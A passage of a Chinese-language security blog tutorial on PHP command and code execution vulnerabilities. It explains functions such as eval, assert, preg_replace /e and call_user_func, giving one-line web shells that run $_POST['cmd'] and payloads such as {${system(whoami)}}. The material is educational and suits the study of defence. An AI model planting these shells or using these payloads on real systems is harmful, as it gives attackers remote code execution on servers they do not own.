@@ -1,0 +1,500 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>0x09 - Web安全基础-命令执行GetShell | 晚上十一点睡觉のBlog</title><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令执行 命令执行命令执行漏洞简介原因应用未对用户输入做严格得检查过滤，导致用户输入得参数被当成命令来执行。 危害 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell，获得目标服务器的权限 进一步内网渗透  远程代码执行因为业务需求，在PHP中有时需要调用一些执行命令的函数，如： ev"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://gungnir.top/posts/34204/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?60a7a67c81784f02b889a11753e4e8cc";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '0x09 - Web安全基础-命令执行GetShell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-28 03:04:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237504.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉のBlog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x09 - Web安全基础-命令执行GetShell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-14T07:33:20.000Z" title="发表于 2022-11-14 15:33:20">2022-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-27T19:04:54.240Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0x09 - Web安全基础-命令执行GetShell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/34204/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>命令执行</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行漏洞简介"><a href="#命令执行漏洞简介" class="headerlink" title="命令执行漏洞简介"></a>命令执行漏洞简介</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>应用未对用户输入做严格得检查过滤，导致用户输入得参数被当成命令来执行。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
+<li>反弹shell，获得目标服务器的权限</li>
+<li>进一步内网渗透</li>
+</ul>
+<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>因为业务需求，在PHP中有时需要调用一些执行命令的函数，如： <code>eval() 、assert() 、 preg_replace() 、 create_function()</code> 等，如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就可能存在远程代码执行漏洞。</p>
+<h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个<code>ping</code>操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次<code>ping</code>测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，让后台进行执行，从而获得后台服务器权限。利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有 <code>system()、exec()、shell_exec()、passthru()、penti_exec()、popen()、proc_pen()</code>等，此外还有<code>反引号命令</code>执行，这种方式实际上是调用 <code>shell_exec()</code>函数来执行。</p>
+<h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a><code>eval()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把字符串 <code>code</code> 变量作为PHP代码执行（在php中<code>$code</code>表示定义一个名叫<code>code</code>的变量）</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li><code>eval()</code> 函数传入的参数必须为<strong>PHP代码</strong>，即要以分号结尾；</li>
+<li><code>@</code>在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。</li>
+<li>函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供的、未经完整验证过的数据 。</li>
+</ul>
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a><code>assert()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果 <code>assertion</code> 是字符串，它将会被 <code>assert()</code> 当做 PHP 代码来执行。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p><code>assert()</code>函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾（其实实际上操作的时候加不加；都可以执行)</p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><code>preg_replace()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="comment">#preg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>执行一个正则表达式的搜索和替换，搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分， 以<code>replacement</code> 进行替换。</p>
+</blockquote>
+<p>实例1：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;just test&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意1：</p>
+<ul>
+<li><code>pattern</code>   要搜索的模式。可以使一个字符串或字符串数组。可以使用一些<code>PCRE</code>修饰符。</li>
+<li><code>PCRE</code>修饰符<code>/e</code> ：<code>preg_replace()</code>在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码执行, 并使用执行结果替换原本的字符串。<code>/e</code>的作用还是蛮重要的，将 replacement 参数当作 PHP 代码，注意是执行完再替换。</li>
+<li>新版本<code>/e</code>修饰符没有使用</li>
+</ul>
+<p>实例2：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;e代码执行漏洞_2021！的博客-CSDN博客</a></p>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141731622.png" alt="image-20221114173127302" style="zoom:33%;" />
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))       <span class="comment">//GET获取data的值</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];        <span class="comment">//如果有获取到值，就将其赋给data变量</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要这样子传参：GET请求url后面加上?data=[php]&#123;$&#123;system(whoami)&#125;&#125;[/php]传递data参数。php代码才会从GET里面抓取到data变量 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意2：</p>
+<ul>
+<li><p>和前面一样 使用 <code>/e</code> 修正符使 <code>preg_replace()</code> 将 <code>replacement</code> 参数当作 PHP 代码执行</p>
+</li>
+<li><p>php函数：<code>strtoupper ( string $string ) : string</code>       将 <code>string</code> 中所有的字母字符转换为大写并返回。</p>
+</li>
+<li><p><code>preg_replace()</code> 函数在匹配到符号正则的字符串时，会将替换字符串（第二个参数）当做代码来执行，但是这里的第二个参数却固定为 <code>strtolower(“\1”)</code>’字符串。上面的命令执行，相当于 <code>eval(‘strtolower(“\1”);’)</code> 结果，当中的 <code>\1</code> 实际上就是 <code>\1</code> ，而 <code>\1</code> 在正则表达式中有自己的含义。</p>
+</li>
+</ul>
+<blockquote>
+<p>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+<p>所以这里的 <code>\1</code> 实际上指定的是第一个子匹配项</p>
+</blockquote>
+<ul>
+<li>正则表达式<code>(.*)</code>的解释：匹配所有</li>
+</ul>
+<blockquote>
+<p><code>.</code>  是任意字符 可以匹配任何单个字符，<code>*</code> 匹配0或多个正好在它之前的那个字符。例如正则表达式。<code>*</code>意味着能够匹配任意数量的任何字符</p>
+<p><code>.*</code>具有贪婪的性质，首先匹配到不能匹配为止，根据后面的正则表达式，会进行回溯。<code>.*？</code>则相反，一个匹配以后，就往下进行，所以不会进行回溯，具有最小匹配的性质。</p>
+</blockquote>
+<ul>
+<li><p>单引号串和双引号串在PHP中的处理是不相同的。双引号串中的内容可以被解释而且替换，而单引号串中的内容总被认为是普通字符</p>
+<p>但是！！双引号中的函数不会被执行和替换。</p>
+</li>
+<li><p><strong>防御：</strong>将 <code>strtoupper(&quot;\\1&quot;)</code> <code>修改为strtoupper(&#39;\\1&#39;)</code>,这样<code>&#39;$&#123;phpinfo()&#125;&#39;</code>就会被当做一个普通的字符串处理（单引号中的变量不会被处理）</p>
+</li>
+</ul>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a><code>array_map()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array1</span> [, <span class="keyword">array</span> $... ] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作用：为数组的每个元素应用回调函数，意思就是将array里面的每个成员都交给一个回调函数去执行！！</p>
+</blockquote>
+<p>注意：</p>
+<ul>
+<li><code>callable $callback</code>  回调函数</li>
+<li><code>array_map()</code>：返回数组，是为 <code>array1</code> 每个元素应用<code>callback</code>函数之后的数组。</li>
+<li><code>callback</code> 函数<u>形参的数量</u>和传给 <u><code>array_map()</code> 数组数量</u>，两者必须一样。</li>
+<li><code>callback</code>函数一般设置为<code>func=assert</code>，<code>cmd=system(whoami)</code>。最终即<code>assert(system(whoami);)</code></li>
+</ul>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li><code>array_map()</code> 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</li>
+</ul>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141744312.png" alt="image-20221114174438015" style="zoom: 33%;" />
+
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><code>create_function()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>从传递的参数创建一个匿名函数，并为其返回唯一的名称。</p>
+<p>通常这些参数将作为<strong>单引号</strong>分隔的字符串传递。</p>
+<p>使用单引号的原因是为了保护变量名不被解析，否则，如果使用双引号，就需要转义变量名，例如$avar。</p>
+</blockquote>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="comment">//创建匿名函数执行代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141753192.png" alt="image-20221114175331855" style="zoom:33%;" />
+
+<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a><code>call_user_func</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。把第一个参数作为回调函数调用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="comment">//传入的参数作为assert函数的参数</span></span><br><span class="line"><span class="comment">//cmd=system(whoami)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a><code>call_user_func_array</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>调用回调函数，并把一个数组参数作为回调函数的参数。</p>
+<p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组<code>param_arr</code>作为回调函数的的参数传入。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//将传入的参数作为数组的第一个值传递给assert函数</span></span><br><span class="line"><span class="comment">//cmd=system(whoami)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a><code>array_filter</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] )</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用回调函数过滤数组中的单元，依次将 <code>array</code> 数组中的每个值传递到 <code>callback</code> 函数。如果 <code>callback</code> 函数返回 true，则 <code>array</code> 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="comment">//用回调函数过滤数组中的元素：array_filter(数组,函数)</span></span><br><span class="line"><span class="comment">//?func=system</span></span><br><span class="line"><span class="comment">//cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141759389.png" alt="image-20221114175953052" style="zoom: 33%;" />
+
+<h3 id="双引号-中输出可变变量"><a href="#双引号-中输出可变变量" class="headerlink" title="双引号{}中输出可变变量"></a><code>双引号&#123;&#125;中输出可变变量</code></h3><blockquote>
+<p>这个地方不是很理解，搞的不是很透彻，php这段语法里面的两个中括号不是很懂</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// echo &quot;phpinfo()&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>关于<code>echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</code>部分的讲解</p>
+<blockquote>
+<ul>
+<li><p>在PHP当中，<code>$&#123;&#125;</code>是可以构造一个变量的，<code>&#123;&#125;</code>写的是一般的字符，那么就会被当成变量，比如<code>$&#123;a&#125;</code>等价于<code>$a</code>，那如果<code>&#123;&#125;</code>写的是一个已知函数名称呢？那么这个函数就会被执行；</p>
+</li>
+<li><p>对于<strong>可变变量</strong>使用大括号，比如：<code>&#123;$val&#125;</code>，这时候大括号就是告诉PHP，括起来的部分要当成变量处理</p>
+</li>
+</ul>
+<blockquote>
